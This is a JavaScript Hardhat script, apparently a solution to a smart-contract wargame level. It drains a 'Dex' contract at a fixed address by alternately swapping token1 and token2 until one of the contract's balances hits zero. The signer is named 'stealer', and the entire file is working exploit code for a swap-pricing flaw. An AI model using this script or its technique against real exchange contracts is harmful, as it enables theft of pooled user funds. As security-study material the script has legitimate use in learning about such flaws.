const hre = require("hardhat");
const { ethers } = hre;

let dex, token1Addr, token2Addr;

async function swapToken1ForToken2() {
  const [stealer] = await hre.ethers.getSigners();

  const token1Balance = await dex.balanceOf(token1Addr, stealer.address);
  const contractToken1Balance = await dex.balanceOf(token1Addr, dex.address);

  const swapAmount = token1Balance.gt(contractToken1Balance) ? contractToken1Balance : token1Balance;

  console.log(`SWAP ${swapAmount.toString()} TOKEN 1 <-> TOKEN 2`);
  await (await dex.swap(token1Addr, token2Addr, swapAmount)).wait();
}

async function swapToken2ForToken1() {
  const [stealer] = await hre.ethers.getSigners();

  const token2Balance = await dex.balanceOf(token2Addr, stealer.address);
  const contractToken2Balance = await dex.balanceOf(token2Addr, dex.address);

  const swapAmount = token2Balance.gt(contractToken2Balance) ? contractToken2Balance : token2Balance;

  console.log(`SWAP ${swapAmount.toString()} TOKEN 2 <-> TOKEN 1`);
  await (await dex.swap(token2Addr, token1Addr, swapAmount)).wait();
}

async function drainedDexFunds() {
  return (await dex.balanceOf(token1Addr, dex.address)).eq(0) || (await dex.balanceOf(token2Addr, dex.address)).eq(0);
}

async function logFundsStats() {
  const [stealer] = await hre.ethers.getSigners();

  console.log("-------------------\nCONTRACT");
  console.log("Token1:", (await dex.balanceOf(token1Addr, dex.address)).toString());
  console.log("Token2:", (await dex.balanceOf(token2Addr, dex.address)).toString());
  console.log("*******************\nUSER");
  console.log("Token1:", (await dex.balanceOf(token1Addr, stealer.address)).toString());
  console.log("Token2:", (await dex.balanceOf(token2Addr, stealer.address)).toString());
  console.log("-------------------\n\n");
}

async function main() {
  const dexAddr = "0x7E73E4bCFEF839109bB63C92d185f8BB97D26f2F";
  dex = await ethers.getContractAt("Dex", dexAddr);
  token1Addr = await dex.token1();
  token2Addr = await dex.token2();

  // approve tokens spending
  await (await dex.approve(dex.address, 1000000)).wait();
  console.log("Approved tokens spending");

  await logFundsStats();
  do {
    await swapToken1ForToken2();
    await logFundsStats();
    if (await drainedDexFunds()) {
      break;
    }
    await swapToken2ForToken1();
    await logFundsStats();
  } while (!(await drainedDexFunds()));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
